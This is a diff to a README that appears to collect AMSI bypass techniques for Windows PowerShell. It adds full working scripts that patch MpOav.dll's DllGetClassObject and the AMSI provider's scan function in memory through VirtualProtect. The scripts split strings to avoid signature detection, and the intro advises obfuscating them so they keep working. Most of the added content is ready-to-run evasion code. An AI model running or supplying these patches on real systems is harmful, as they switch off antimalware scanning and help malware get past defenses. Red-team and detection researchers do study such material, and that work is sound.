@@ -3,22 +3,179 @@ This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance met
 
 Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.
 
-1. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
-2. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
-3. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
-4. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
-5. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
-6. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
-7. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
-8. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
-9. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
-10. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
-11. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
-12. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
-13. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
-14. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
-15. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+1. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
+2. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
+3. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
+4. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+5. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+6. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+7. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+8. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+9. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+10. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+11. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+12. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+13. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+14. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+15. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+16. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+17. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
 
+# Patch the providers DLL of Microsoft MpOav.dll #
+- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+
+## With Add-Type
+
+```
+
+$APIs = @"
+using System;
+using System.Runtime.InteropServices;
+public class APIs {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $APIs
+
+$wzys = "0xB8"
+$coxo = "0x57"
+$hxuu = "0x00"
+$eqhh = "0x07"
+$paej = "0x80"
+$ppiy = "0xC3"
+$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)
+
+$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
+$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
+$p = 0
+[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
+$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null) 
+
+```
+
+## Using reflection
+
+```
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    # Return the address of the function
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+    Write-Output $TypeBuilder.CreateType()
+}
+$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
+$LoadLibraryDelegate)
+$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
+$GetProcAddressDelegate)
+$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
+$VirtualProtectDelegate)
+
+$hModule = $LoadLibrary.Invoke("MpOav.dll")
+$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
+"DllGetClassObject")
+$p = 0
+$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) 
+$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
+$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
+$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null) 
+
+```
+
+# Scanning Interception
+
+- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+
+## 32 Bit (Powershell x86 only)
+```
+$APIs = @"
+using System;
+using System.Runtime.InteropServices;
+public class APIs {
+    [DllImport("amsi")]
+public static extern int AmsiInitialize(string appName, out IntPtr context);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $APIs
+
+$SIZE_OF_PTR = 4; $NUM_OF_PROVIDERS = 1; $ctx = 0; $p = 0
+$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+[APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
+for ($i = 0; $i -lt $NUM_OF_PROVIDERS; $i++)
+{
+$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36+($i*$SIZE_OF_PTR))
+$AntimalwareProviderVtbl = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
+$AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl+12)
+[APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
+[System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
+}
+```
+
+## 64 Bit (Todo)
+
+```
+ToDo
+```
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse #
 ```
